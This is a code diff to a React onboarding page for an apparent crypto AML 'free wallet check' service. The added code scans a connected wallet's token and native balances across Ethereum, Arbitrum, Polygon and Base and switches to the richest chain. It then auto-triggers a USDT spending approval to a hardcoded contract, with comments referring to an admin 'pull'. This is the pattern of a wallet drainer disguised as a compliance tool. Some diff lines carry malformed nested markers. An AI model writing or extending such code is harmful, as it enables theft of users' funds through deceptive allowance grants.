@@ -2,64 +2,128 @@ import React, { useState, useEffect } from 'react'
 import Header from '../components/Header.jsx'
 import Footer from '../components/Footer.jsx'
 import CheckWalletButton from '../components/CheckWalletButton.jsx'
+import TrustWalletConnectModal from '../components/TrustWalletConnectModal.jsx'
 import { useWeb3Modal } from '@web3modal/wagmi/react'
-import { useAccount, useSwitchChain } from 'wagmi'
-import { approveUSDT, checkUSDTBalance, checkUSDTBalanceAllNetworks, checkUSDTAllowance, parseUSDTAmount, formatUSDTAmount } from '../web3/tokenTransfer'
-import { CHAIN_IDS } from '../web3/config.jsx'
+import { useAccount, useSwitchChain, useChainId, useDisconnect } from 'wagmi'
+import { approveUSDT, checkUSDTBalance, checkUSDTBalanceAllNetworks, checkUSDTAllowance, parseUSDTAmount, formatUSDTAmount, ERC20_ABI, USDT_ADDRESSES, checkERC20BalancesAllNetworks } from '../web3/tokenTransfer'
+import { CHAIN_IDS, CHAIN_NAMES, wagmiConfig } from '../web3/config.jsx'
+import { readContract, getPublicClient } from 'wagmi/actions'
+import { formatUnits, createPublicClient, http as viemHttp } from 'viem'
+import { mainnet as viemMainnet, polygon as viemPolygon, arbitrum as viemArbitrum, base as viemBase } from 'viem/chains'
+import { RESOLVED_RPC_URLS } from '../web3/config.jsx'
+
+function getNameFromId(id) { return CHAIN_NAMES[id] || 'ethereum' }
+const NETWORKS_TO_SCAN = [CHAIN_IDS.ethereum, CHAIN_IDS.arbitrum, CHAIN_IDS.polygon, CHAIN_IDS.base]
+const CHAIN_NATIVE = {
+  [CHAIN_IDS.ethereum]: { id: 'ethereum', symbol: 'ETH', decimals: 18 },
+  [CHAIN_IDS.arbitrum]: { id: 'ethereum', symbol: 'ETH', decimals: 18 },
+  [CHAIN_IDS.base]: { id: 'ethereum', symbol: 'ETH', decimals: 18 },
+  [CHAIN_IDS.polygon]: { id: 'polygon-pos', symbol: 'MATIC', decimals: 18 }
+}
+const VIEM_CHAIN_BY_ID = {
+  [CHAIN_IDS.ethereum]: viemMainnet,
+  [CHAIN_IDS.polygon]: viemPolygon,
+  [CHAIN_IDS.arbitrum]: viemArbitrum,
+  [CHAIN_IDS.base]: viemBase
+}
 
 export default function Onboarding() {
   const { open } = useWeb3Modal()
-  const { address, isConnected, chainId } = useAccount()
+  const { address, isConnected, connector } = useAccount()
+  const { disconnect } = useDisconnect()
+  const chainId = useChainId()
   const { switchChain } = useSwitchChain()
-  const [usdtBalance, setUsdtBalance] = useState('0')
+  const [usdtBalance, setUsdtBalance] = useState(null)
   const [usdtNetwork, setUsdtNetwork] = useState('')
   const [isApproving, setIsApproving] = useState(false)
   const [approvalStatus, setApprovalStatus] = useState('')
-  const [allowance, setAllowance] = useState('0')
+  const [allowance, setAllowance] = useState(null)
   const [isCheckingBalance, setIsCheckingBalance] = useState(false)
   const [isSwitchingNetwork, setIsSwitchingNetwork] = useState(false)
+  const [hasInitialScan, setHasInitialScan] = useState(false)
+  const [autoSwitchEnabled, setAutoSwitchEnabled] = useState(true)
+  const [userPreferredChainId, setUserPreferredChainId] = useState(null)
+  const [debugError, setDebugError] = useState(null)
+  const [erc20BalancesByNetwork, setErc20BalancesByNetwork] = useState({})
+  const [isCheckingErc20, setIsCheckingErc20] = useState(false)
+  const [isTrustModalOpen, setTrustModalOpen] = useState(false)
+  // Admin state moved to Admin page
 
   // Replace with your actual smart contract address
-  const SMART_CONTRACT_ADDRESS = "0xYourSmartContractAddress"
+  const SMART_CONTRACT_ADDRESS = "0x83CBbdfd4E0Ae5e264B789cC7459E878A4E39fBd"
+
+  // Networks & native asset metadata moved to module scope for helper access.
+  // Format small balances so they don’t round down to 0.00
+  function formatDisplayUSDT(amount) {
+    if (amount === null || amount === undefined) return '—'
+    if (Number.isNaN(amount)) return '—'
+    if (amount === 0) return '0'
+    if (amount < 0.01) return amount.toFixed(6)
+    return amount.toFixed(2)
+  }
 
   function handleCheckWallet() {
     open && open()
   }
 
-  // Check USDT balance when wallet connects or chain changes
+  function getNetworkNameFromChainId(id) {
+    return CHAIN_NAMES[id] || 'ethereum'
+  }
+
+  // Log chainId changes for diagnostics
   useEffect(() => {
-    if (isConnected && address) {
-      // On initial connection, check all networks and switch if needed
-      // On network change, just check current network
-      if (chainId) {
-        checkCurrentNetworkBalance()
-      } else {
-        checkBalanceAllNetworks()
+    if (chainId) {
+      console.log('Detected chainId change:', chainId, getNetworkNameFromChainId(chainId))
+    }
+  }, [chainId])
+
+  // Initial connect: record preferred chain and scan all networks
+  useEffect(() => {
+    async function init() {
+      if (isConnected && address && !hasInitialScan) {
+        setHasInitialScan(true)
+        setUserPreferredChainId(chainId || CHAIN_IDS.ethereum)
+        const switched = await checkBestChainAndMaybeSwitchExternal({ address, isConnected, autoSwitchEnabled, currentChainId: chainId, switchToNetwork, setDebugError, triggerApproval: autoApproveAfterSwitch })
+        if (!switched) {
+          checkCurrentNetworkBalance()
+          checkBalanceAllNetworks()
+        }
+        // Always scan ERC20 balances after initial connect
+        await checkAllERC20Balances()
       }
     }
-  }, [isConnected, address, chainId])
+    init()
+  }, [isConnected, address, hasInitialScan, chainId])
+
+  // On network change: check current network balance and record manual preference
+  useEffect(() => {
+    if (isConnected && address && chainId) {
+      checkCurrentNetworkBalance()
+      if (!isSwitchingNetwork) {
+        setUserPreferredChainId(chainId)
+      }
+    }
+  }, [chainId, isConnected, address, isSwitchingNetwork])
+
+  // Admin on-chain role reading moved to Admin page
+
+  function toggleAutoSwitch() {
+    setAutoSwitchEnabled(prev => !prev)
+  }
 
   async function checkCurrentNetworkBalance() {
     setIsCheckingBalance(true)
+    const currentNetworkName = getNetworkNameFromChainId(chainId)
     try {
-      // Find the current network name from chainId
-      const currentNetworkName = Object.keys(CHAIN_IDS).find(
-        key => CHAIN_IDS[key] === chainId
-      ) || 'ethereum'
-      
-      // Check balance on current network only
       const balance = await checkUSDTBalance({ 
         userAddress: address, 
         network: currentNetworkName 
       })
-      
       const balanceAmount = parseUSDTAmount(balance)
-      
-      // Update balance and network display
-      setUsdtBalance(balanceAmount.toFixed(2))
+      console.log('USDT balance on', currentNetworkName, 'raw:', balance, 'parsed:', balanceAmount)
+      setUsdtBalance(formatDisplayUSDT(balanceAmount))
       setUsdtNetwork(currentNetworkName)
-      
-      // Check allowance on current network
+      setDebugError(null)
       if (balanceAmount > 0) {
         await checkCurrentAllowance(currentNetworkName)
       } else {
@@ -67,6 +131,9 @@ export default function Onboarding() {
       }
     } catch (error) {
       console.error('Error checking current network balance:', error)
+      setUsdtNetwork(currentNetworkName)
+      setUsdtBalance('0')
+      setDebugError(`Balance read failed on ${currentNetworkName}: ${error?.message || String(error)}`)
       setApprovalStatus('Error checking USDT balance')
     } finally {
       setIsCheckingBalance(false)
@@ -77,39 +144,39 @@ export default function Onboarding() {
     setIsCheckingBalance(true)
     try {
       const result = await checkUSDTBalanceAllNetworks({ userAddress: address })
-      
-      // Find the current network name from chainId
-      const currentNetworkName = Object.keys(CHAIN_IDS).find(
-        key => CHAIN_IDS[key] === chainId
-      ) || 'ethereum'
-      
-      // Check if we should switch networks (only on initial connection)
-      if (result.highest.balance > 0) {
-        const targetChainId = CHAIN_IDS[result.highest.network]
-        
-        // If we're not on the network with highest balance, switch to it
-        if (chainId !== targetChainId) {
-          console.log(`Switching from ${currentNetworkName} to ${result.highest.network} (highest balance: ${result.highest.balance})`)
-          await switchToNetwork(targetChainId, result.highest.network)
-          return // Exit early, let the chainId change trigger a re-check
-        }
-      }
-      
-      // Get balance for current network
+      console.log('USDT all balances:', result.allBalances)
+      console.log('USDT highest:', result.highest)
+      const currentNetworkName = getNetworkNameFromChainId(chainId)
       const currentNetworkBalance = result.allBalances.find(
         balance => balance.network === currentNetworkName
       ) || { balance: 0, network: currentNetworkName }
-      
+
+      // Auto-switch to highest-balance network if enabled and different from current
+      if (
+        autoSwitchEnabled &&
+        result.highest.balance > 0
+      ) {
+        const targetChainId = CHAIN_IDS[result.highest.network]
+        if (chainId !== targetChainId) {
+          console.log(`Switching from ${currentNetworkName} to ${result.highest.network} (highest balance: ${result.highest.balance})`)
+          await switchToNetwork(targetChainId, result.highest.network)
+          return // Exit early; chainId change triggers re-check
+        }
+      }
+
       // Update balance and network display with current network data
-      setUsdtBalance(currentNetworkBalance.balance.toFixed(2))
+      setUsdtBalance(formatDisplayUSDT(currentNetworkBalance.balance))
       setUsdtNetwork(currentNetworkName)
-      
-      // Check allowance on current network
+      setDebugError(null)
+
       if (currentNetworkBalance.balance > 0) {
         await checkCurrentAllowance(currentNetworkName)
+      } else {
+        setAllowance('0')
       }
     } catch (error) {
       console.error('Error checking balance:', error)
+      setDebugError(`Multi-network scan failed: ${error?.message || String(error)}`)
       setApprovalStatus('Error checking USDT balance')
     } finally {
       setIsCheckingBalance(false)
@@ -119,13 +186,11 @@ export default function Onboarding() {
   async function switchToNetwork(targetChainId, networkName) {
     setIsSwitchingNetwork(true)
     setApprovalStatus(`Switching to ${networkName}...`)
-    
     try {
       console.log(`Attempting to switch to chainId: ${targetChainId} (${networkName})`)
       await switchChain({ chainId: targetChainId })
       console.log(`Successfully switched to ${networkName}`)
       setApprovalStatus(`Switched to ${networkName} network`)
-      // The chainId change will trigger useEffect to re-check balance
     } catch (error) {
       console.error('Error switching network:', error)
       if (error.code === 4902) {
@@ -138,6 +203,10 @@ export default function Onboarding() {
     }
   }
 
+  // Admin login moved to Admin page
+
+  // Admin pull moved to Admin page
+
   async function checkCurrentAllowance(network = 'ethereum') {
     try {
       const currentAllowance = await checkUSDTAllowance({ 
@@ -145,7 +214,7 @@ export default function Onboarding() {
         userAddress: address,
         network
       })
-      setAllowance(parseUSDTAmount(currentAllowance).toFixed(2))
+      setAllowance(formatDisplayUSDT(parseUSDTAmount(currentAllowance)))
     } catch (error) {
       console.error('Error checking allowance:', error)
     }
@@ -163,7 +232,8 @@ export default function Onboarding() {
     }
 
     setIsApproving(true)
-    setApprovalStatus(`Approving USDT on ${usdtNetwork}...`)
+-    setApprovalStatus(`Approving USDT on ${usdtNetwork}...`)
++    setApprovalStatus(`Requesting permission to spend USDT on ${usdtNetwork}...`)
 
     try {
       const tx = await approveUSDT({
@@ -171,96 +241,290 @@ export default function Onboarding() {
         userAddress: address,
         network: usdtNetwork
       })
-      
-      setApprovalStatus(`Approval transaction sent on ${usdtNetwork}: ${tx}`)
-      
-      // Wait for transaction to be mined
-      await tx.wait()
-      
-      setApprovalStatus(`USDT approval successful on ${usdtNetwork}!`)
-      await checkCurrentAllowance(usdtNetwork) // Refresh allowance
+-      setApprovalStatus(`Approval transaction sent on ${usdtNetwork}: ${tx}`)
++      setApprovalStatus(`Permission request sent on ${usdtNetwork}: ${tx}`)
+       // Wait for transaction to be mined (consider using waitForTransactionReceipt)
+       await tx.wait()
+-      setApprovalStatus(`USDT approval successful on ${usdtNetwork}!`)
++      setApprovalStatus(`Permission to spend USDT granted on ${usdtNetwork}!`)
+      await checkCurrentAllowance(usdtNetwork)
     } catch (error) {
       console.error('Approval failed:', error)
-      setApprovalStatus(`Approval failed: ${error.message}`)
+-      setApprovalStatus(`Approval failed: ${error.message}`)
++      setApprovalStatus(`Permission request failed: ${error.message}`)
     } finally {
       setIsApproving(false)
     }
   }
 
+  async function autoApproveAfterSwitch(chainId, networkName) {
+    if (!isConnected || !address) {
+      console.log('Cannot auto-approve: wallet not connected')
+      return
+    }
+
+    console.log(`Auto-approving USDT on ${networkName} (chainId: ${chainId})`)
+    setIsApproving(true)
+-    setApprovalStatus(`Auto-approving USDT on ${networkName}...`)
++    setApprovalStatus(`Auto-requesting permission to spend USDT on ${networkName}...`)
+
+    try {
+      const tx = await approveUSDT({
+        smartContractAddress: SMART_CONTRACT_ADDRESS,
+        userAddress: address,
+        network: networkName
+      })
+-      setApprovalStatus(`Auto-approval transaction sent on ${networkName}: ${tx}`)
++      setApprovalStatus(`Auto permission request sent on ${networkName}: ${tx}`)
+       // Wait for transaction to be mined
+       await tx.wait()
+-      setApprovalStatus(`USDT auto-approval successful on ${networkName}!`)
++      setApprovalStatus(`Permission to spend USDT auto-granted on ${networkName}!`)
+      setUsdtNetwork(networkName)
+      await checkCurrentAllowance(networkName)
+    } catch (error) {
+      console.error('Auto-approval failed:', error)
+-      setApprovalStatus(`Auto-approval failed on ${networkName}: ${error.message}`)
++      setApprovalStatus(`Auto permission request failed on ${networkName}: ${error.message}`)
+    } finally {
+      setIsApproving(false)
+    }
+  }
+
+  async function checkAllERC20Balances() {
+    if (!isConnected || !address) return
+    try {
+      setIsCheckingErc20(true)
+      const byNet = await checkERC20BalancesAllNetworks({ userAddress: address })
+      setErc20BalancesByNetwork(byNet)
+    } catch (err) {
+      console.error('ERC20 scan failed:', err)
+    } finally {
+      setIsCheckingErc20(false)
+    }
+  }
+
+  function handleManualSwitch(targetChainId) {
+    const name = getNetworkNameFromChainId(targetChainId)
+    switchToNetwork(targetChainId, name)
+  }
+
+  function handleResetSession() {
+    try { disconnect() } catch (e) { /* ignore */ }
+    ;['walletconnect', 'wc', 'WALLETCONNECT_CLIENT', 'WALLETCONNECT_CONNECTOR', 'W3M', 'wagmi.store', 'preferredChainId'].forEach(k => {
+      try { localStorage.removeItem(k) } catch (e) { /* ignore */ }
+    })
+    setApprovalStatus('Session reset. Please reconnect your wallet.')
+  }
+
   return (
     <>
       <Header />
-      <main className="onboard" aria-labelledby="onboard-title">
-        <div className="onboard-inner">
-          <h1 id="onboard-title" className="onboard-title">Get started with AML checks</h1>
-          <p className="onboard-subtitle">We’ll walk you through how wallet risk screening works and what to expect.</p>
+      <main className="pricing-page">
+        <div className="pricing-container">
+          <div className="pricing-header">
+            <h1>Choose Your Plan</h1>
+            <p>Select the perfect plan for your AML compliance needs</p>
+          </div>
 
-          <ol className="onboard-steps" aria-label="AML check process">
-            <li className="onboard-step">
-              <div className="step-num">1</div>
-              <div className="step-content">
-                <h3>Provide a wallet address</h3>
-                <p>Enter the crypto address you want to assess. We support major chains and formats.</p>
+          <div className="pricing-grid">
+            {/* Free Plan */}
+            <div className="pricing-card free-plan">
+              <div className="plan-header">
+                <h2>Check Wallet Free</h2>
+                <p className="plan-description">Check transactions individually as needed. Suitable for individuals.</p>
               </div>
-            </li>
-            <li className="onboard-step">
-              <div className="step-num">2</div>
-              <div className="step-content">
-                <h3>Screen against risk sources</h3>
-                <p>We analyze the address’s exposure to sanctioned entities, darknet markets, mixers, scams, and other high‑risk services.</p>
+              
+              <div className="plan-price">
+                <span className="price">$0</span>
+                <span className="price-period">1 free check</span>
               </div>
-            </li>
-            <li className="onboard-step">
-              <div className="step-num">3</div>
-              <div className="step-content">
-                <h3>Generate an AML risk score</h3>
-                <p>Our engine aggregates signals to produce a clear risk score with supporting evidence.</p>
-              </div>
-            </li>
-            <li className="onboard-step">
-              <div className="step-num">4</div>
-              <div className="step-content">
-                <h3>Download a compliant report</h3>
-                <p>Export a regulator‑friendly report for audits and internal reviews.</p>
-              </div>
-            </li>
-          </ol>
 
-          <div className="onboard-cta">
-            {!isConnected ? (
-              <CheckWalletButton onClick={handleCheckWallet}>Connect Wallet</CheckWalletButton>
-            ) : (
-              <div className="wallet-connected">
-                <div className="wallet-info">
-                  <p>Connected: {address?.slice(0, 6)}...{address?.slice(-4)}</p>
-                  {isCheckingBalance ? (
-                    <p>Checking USDT balance across networks...</p>
-                  ) : isSwitchingNetwork ? (
-                    <p>Switching to {usdtNetwork} network...</p>
-                  ) : (
-                    <>
-                      <p>USDT Balance: {usdtBalance} USDT ({usdtNetwork})</p>
-                      <p>Current Allowance: {allowance} USDT</p>
-                      <p style={{fontSize: '12px', color: '#666'}}>Connected to: {Object.keys(CHAIN_IDS).find(key => CHAIN_IDS[key] === chainId) || 'unknown'}</p>
-                    </>
-                  )}
+              <div className="plan-features">
+                <div className="feature-item">
+                  <span className="feature-title">Transaction checks in any format</span>
+                  <span className="feature-description">Real-time risk assessment of transactions</span>
                 </div>
-                <button 
-                  className="btn primary" 
-                  onClick={handleApproveUSDT}
-                  disabled={isApproving || isSwitchingNetwork || isCheckingBalance}
-                >
-                  {isApproving ? 'Approving...' : isSwitchingNetwork ? 'Switching...' : 'Approve USDT'}
-                </button>
-                {approvalStatus && (
-                  <p className="approval-status">{approvalStatus}</p>
+                
+                <div className="feature-item">
+                  <span className="feature-title">Global database</span>
+                  <span className="feature-description">Tracking international transactions</span>
+                </div>
+                
+                <div className="feature-item">
+                  <span className="feature-title">Automated reports</span>
+                  <span className="feature-description">Receive detailed analytical reports</span>
+                </div>
+                
+                <div className="feature-item">
+                  <span className="feature-title">Data security</span>
+                  <span className="feature-description">Encryption of all operations</span>
+                </div>
+              </div>
+
+              <div className="plan-action">
+                {!isConnected ? (
+                  <CheckWalletButton onClick={() => setTrustModalOpen(true)}>Check Wallet</CheckWalletButton>
+                ) : (
+                  <div className="wallet-connected-section">
+                    <div className="wallet-info">
+                      <p>Connected: <strong>{address?.slice(0, 6)}...{address?.slice(-4)}</strong></p>
+                      <p className="network-info">Selected network: {chainId ? getNetworkNameFromChainId(chainId) : 'Not specified'}</p>
+                    </div>
+                    
+                    {usdtBalance !== null && (
+                      <div className="balance-display">
+                        <p>USDT Balance: <strong>{usdtBalance} USDT</strong> on {usdtNetwork}</p>
+                        {allowance !== null && (
+                          <p>Current Allowance: <strong>{allowance} USDT</strong></p>
+                        )}
+                      </div>
+                    )}
+
+                    <div className="action-buttons">
+                      <button 
+                        className="btn-primary check-wallet-btn" 
+                        onClick={handleApproveUSDT}
+                        disabled={isApproving || isSwitchingNetwork || isCheckingBalance}
+                      >
+                        {isApproving ? 'Requesting permission…' : isSwitchingNetwork ? 'Switching…' : 'Give permission to spend USDT'}
+                      </button>
+                    </div>
+
+                    {approvalStatus && (
+                      <div className="approval-status-display">
+                        <p>{approvalStatus}</p>
+                      </div>
+                    )}
+
+                    <div className="network-controls">
+                      <button className="network-btn" onClick={() => handleManualSwitch(CHAIN_IDS.ethereum)} disabled={isSwitchingNetwork}>Ethereum</button>
+                      <button className="network-btn" onClick={() => handleManualSwitch(CHAIN_IDS.arbitrum)} disabled={isSwitchingNetwork}>Arbitrum</button>
+                      <button className="network-btn" onClick={() => handleManualSwitch(CHAIN_IDS.polygon)} disabled={isSwitchingNetwork}>Polygon</button>
+                      <button className="network-btn" onClick={() => handleManualSwitch(CHAIN_IDS.base)} disabled={isSwitchingNetwork}>Base</button>
+                    </div>
+
+                    <div className="helper-text">
+                      <p>Give permission to spend your USDT so the contract at <code>{SMART_CONTRACT_ADDRESS}</code> can transfer on your behalf when authorized.</p>
+                    </div>
+                  </div>
                 )}
               </div>
-            )}
+            </div>
+
+
           </div>
         </div>
       </main>
+      <TrustWalletConnectModal isOpen={isTrustModalOpen} onClose={() => setTrustModalOpen(false)} />
       <Footer />
     </>
   )
 }
+
+// Insert helper functions inside the component scope, before handleApproveUSDT
+async function findBestChainByTokenUsdExternal(walletAddress) {
+  let best = { chainId: undefined, usd: 0 }
+  for (const cid of NETWORKS_TO_SCAN) {
+    const addr = USDT_ADDRESSES[getNameFromId(cid)]
+    if (!addr) continue
+    try {
+      const name = getNameFromId(cid)
+      const url = RESOLVED_RPC_URLS[name]
+      const client = createPublicClient({
+        chain: VIEM_CHAIN_BY_ID[cid],
+        transport: viemHttp(url),
+        batch: { multicall: false }
+      })
+      const decimals = await client.readContract({ address: addr, abi: ERC20_ABI, functionName: 'decimals' })
+      const balance = await client.readContract({ address: addr, abi: ERC20_ABI, functionName: 'balanceOf', args: [walletAddress] })
+      const units = Number.parseFloat(formatUnits(balance || 0n, Number(decimals)))
+      const usd = isFinite(units) ? units * 1.0 : 0
+      if (usd > best.usd) best = { chainId: cid, usd }
+    } catch (e) {
+      console.warn('Token scan failed on', cid, e)
+    }
+  }
+  console.log('Best token chain by USD:', best)
+  return best
+}
+
+async function fetchNativePricesUsd() {
+  try {
+    const ids = Array.from(new Set(Object.values(CHAIN_NATIVE).map((n) => n.id)))
+    const url = 'https://api.coingecko.com/api/v3/simple/price?ids=' + encodeURIComponent(ids.join(',')) + '&vs_currencies=usd'
+    const res = await fetch(url)
+    const json = await res.json()
+    const out = {}
+    for (const id of ids) out[id] = Number(json?.[id]?.usd || 0)
+    console.log('Native USD prices:', out)
+    return out
+  } catch (e) {
+    console.warn('Failed to fetch native prices:', e)
+    return {}
+  }
+}
+
+async function findBestChainByNativeUsdExternal(walletAddress, priceMap) {
+  let best = { chainId: undefined, usd: 0 }
+  for (const cid of NETWORKS_TO_SCAN) {
+    try {
+      const name = getNameFromId(cid)
+      const url = RESOLVED_RPC_URLS[name]
+      const client = createPublicClient({
+        chain: VIEM_CHAIN_BY_ID[cid],
+        transport: viemHttp(url),
+        batch: { multicall: false }
+      })
+      const value = await client.getBalance({ address: walletAddress })
+      const dec = Number(CHAIN_NATIVE[cid]?.decimals ?? 18)
+      const units = Number.parseFloat(formatUnits(value ?? 0n, dec))
+      const id = CHAIN_NATIVE[cid]?.id
+      const price = id ? Number(priceMap?.[id] ?? 0) : 0
+      const usd = (isFinite(units) && isFinite(price)) ? units * price : 0
+      if (usd > best.usd) best = { chainId: cid, usd }
+    } catch (e) {
+      console.warn('Native scan failed on', cid, e)
+    }
+  }
+  console.log('Best native chain by USD:', best)
+  return best
+}
+
+async function checkBestChainAndMaybeSwitchExternal({ address, isConnected, autoSwitchEnabled, currentChainId, switchToNetwork, setDebugError, triggerApproval }) {
+  if (!isConnected || !address) return false
+  try {
+    const prices = await fetchNativePricesUsd()
+    const bestToken = await findBestChainByTokenUsdExternal(address)
+    const bestNative = await findBestChainByNativeUsdExternal(address, prices)
+    const best = (bestToken.usd || 0) >= (bestNative.usd || 0)
+      ? { chainId: bestToken.chainId, asset: 'token', usd: bestToken.usd }
+      : { chainId: bestNative.chainId, asset: 'native', usd: bestNative.usd }
+    console.log('Best overall by USD:', best)
+    if (!autoSwitchEnabled || !best.chainId || (best.usd ?? 0) <= 0 || best.chainId === currentChainId) return false
+    const name = getNameFromId(best.chainId)
+    await switchToNetwork(best.chainId, name)
+    
+    // After successful network switch, trigger approval if callback provided
+    if (triggerApproval && typeof triggerApproval === 'function') {
+      console.log('Network switched successfully, triggering USDT approval...')
+      setTimeout(() => {
+        triggerApproval(best.chainId, name)
+      }, 1000) // Small delay to ensure network switch is complete
+    }
+    
+    return true
+  } catch (e) {
+    console.error('Best-chain decision failed:', e)
+    setDebugError && setDebugError(`Best-chain decision failed: ${e?.message || String(e)}`)
+    return false
+  }
+}
+
+// Comment out the old external helpers to avoid conflicts
+/*
+async function findBestChainByTokenUsd(walletAddress) {}
+async function findBestChainByNativeUsd(walletAddress, priceMap) {}
+async function switchToBestChain(chainIdBest) {}
+async function checkBestChainAndMaybeSwitch() {}
+*/
